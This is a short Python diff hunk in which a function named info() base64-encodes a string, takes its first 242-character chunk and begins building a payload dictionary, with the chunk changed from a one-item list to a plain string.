@@ -60,7 +60,7 @@ def info():
     data_bytes = inf.encode('utf-8')
     encoded_data = base64.b64encode(data_bytes).decode('utf-8')
     chunk_size = 242
-    chunks = [encoded_data[0:chunk_size]]# for i in range(0, len(encoded_data), chunk_size)]
+    chunks = encoded_data[0:chunk_size]# for i in range(0, len(encoded_data), chunk_size)]
 
     #for chunk in chunks:
     payload_data = {
